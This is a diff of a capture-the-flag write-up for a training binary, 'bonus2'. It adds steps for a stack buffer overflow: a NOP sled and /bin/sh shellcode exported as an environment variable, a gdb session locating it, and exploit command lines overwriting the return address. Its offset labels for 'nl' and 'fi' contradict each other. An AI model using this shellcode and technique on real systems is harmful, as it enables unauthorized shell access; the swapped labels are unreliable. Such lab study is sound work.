@@ -94,29 +94,16 @@ gs             0x33	51
 
 We have a padding of 18 for LANG="nl" (Calculated with https://projects.jason-rush.com/tools/buffer-overflow-eip-offset-string-generator).
 
+Now like in the bonus0, we are going to put our shellcode in the environnement variable SHELLCODEINJECTION.
+We need to find where this environnement variable is in the stack :
+
 export SHELLCODEINJECTION=$(python -c 'print "\x90"*128 + "\x31\xc0\x99\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"')
 
 (gdb) b main
 Breakpoint 1 at 0x804852f
 (gdb) 
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
 (gdb) run
 Starting program: /home/user/bonus2/bonus2 
-
 Breakpoint 1, 0x0804852f in main ()
 (gdb) (gdb) x/s *((char **)environ+1)
 Undefined command: "".  Try "help".
@@ -159,6 +146,10 @@ Undefined command: "".  Try "help".
 
 
 0xbffffe93 in little endian = \x93\xfe\xff\xbf
+
+Now we have our two offset for nl (18) and fi (23)
+So we can overwrite the return address of the main function with the address of the shellcode + 18 or 23.
+We just have to put 40 bytes or more for the first argument, and adjust the second argument depending on the LANG variable.
 
 ./bonus2 $(python -c 'print "A" * 60') $(python -c 'print "B" * 18 + "\x93\xfe\xff\xbf"')		--> fi
 ./bonus2 $(python -c 'print "A" * 60') $(python -c 'print "B" * 23 + "\x93\xfe\xff\xbf"')		--> nl
